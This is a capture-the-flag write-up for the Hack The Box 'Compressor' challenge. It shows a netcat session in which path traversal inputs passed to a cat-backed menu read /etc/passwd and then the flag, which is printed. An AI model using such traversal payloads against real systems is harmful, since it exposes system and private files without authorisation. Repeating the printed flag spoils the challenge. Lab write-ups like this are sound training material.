# Compressor

## CHALLENGE INFO

> Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?

### Resources
- Docker instance: `138.68.150.120:32341`


## Enumeration

```bash
$ nc 138.68.150.120 32341

[*] Directory to work in: L6Jzt7Q7IFs4rsHwD6K6MuCPdGaxkYDW

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 1

[*] Sub-directory to work in: L6Jzt7Q7IFs4rsHwD6K6MuCPdGaxkYDW/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 2
/home/ctf/L6Jzt7Q7IFs4rsHwD6K6MuCPdGaxkYDW/Head
total 8
drwxr-sr-x    2 ctf      ctf           4096 May 19 06:53 .
drwxr-sr-x    6 ctf      ctf           4096 May 19 06:53 ..



Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: flag.txt
cat: can't open './flag.txt': No such file or directory
```

It seems like we can use the system to `cat` out a file, but `flag.txt` is not available in the working directory. Let's just try the different options and poke around for a bit.

```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 5



Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 1

[*] Sub-directory to work in: L6Jzt7Q7IFs4rsHwD6K6MuCPdGaxkYDW/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 5



Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 2

[*] Sub-directory to work in: L6Jzt7Q7IFs4rsHwD6K6MuCPdGaxkYDW/Torso


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 5



Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 2

[*] Sub-directory to work in: L6Jzt7Q7IFs4rsHwD6K6MuCPdGaxkYDW/Torso


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 5 L6Jzt7Q7IFs4rsHwD6K6MuCPdGaxkYDW
Traceback (most recent call last):
  File "/home/ctf/artifacts.py", line 101, in <module>
    act = menu()
  File "/home/ctf/artifacts.py", line 65, in menu
    return int(input(colored("[*] Choose action: ", "yellow")))
ValueError: invalid literal for int() with base 10: '5 L6Jzt7Q7IFs4rsHwD6K6MuCPdGaxkYDW'

$ nc 138.68.150.120 32341

[*] Directory to work in: csqZYVQkI8MB6pQAFlbfNDXZ0z9dDhU2

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 4

[*] Sub-directory to work in: csqZYVQkI8MB6pQAFlbfNDXZ0z9dDhU2/Legs


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 2
/home/ctf/csqZYVQkI8MB6pQAFlbfNDXZ0z9dDhU2/Legs
total 8
drwxr-sr-x    2 ctf      ctf           4096 May 19 06:56 .
drwxr-sr-x    6 ctf      ctf           4096 May 19 06:56 ..



Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: cat

$ nc 138.68.150.120 32341

[*] Directory to work in: gjmQ5BZjGk79sWxFaKQq3M721sKuoOfr

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 1

[*] Sub-directory to work in: gjmQ5BZjGk79sWxFaKQq3M721sKuoOfr/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../flag.txt
cat: can't open './../flag.txt': No such file or directory
```

I think a directory traversal attack may work here, but the above payload was basically the same as my previous one, because we are in a `Head` sub directory and the flag is ofcourse still not in the parent directory.

Let's try to traverse some more and see if we can read a file at a known location:

```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../../../../../etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
utmp:x:100:406:utmp:/home/utmp:/bin/false
ctf:x:1000:1000:1000:/home/ctf:/bin/sh
```

That **DID** work! Let's hunt for the flag:

```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../../../../../flag.txt
cat: can't open './../../../../../flag.txt': No such file or directory

Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 2
/home/ctf/gjmQ5BZjGk79sWxFaKQq3M721sKuoOfr/Head
total 8
drwxr-sr-x    2 ctf      ctf           4096 May 19 06:56 .
drwxr-sr-x    6 ctf      ctf           4096 May 19 06:56 ..



Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../flag.txt
cat: can't open './../flag.txt': No such file or directory
```

No luck so far, let's try `../../flag.txt`:

```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../../flag.txt
HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}

Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action:
```

There's our flag!


## Flag

`HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}`
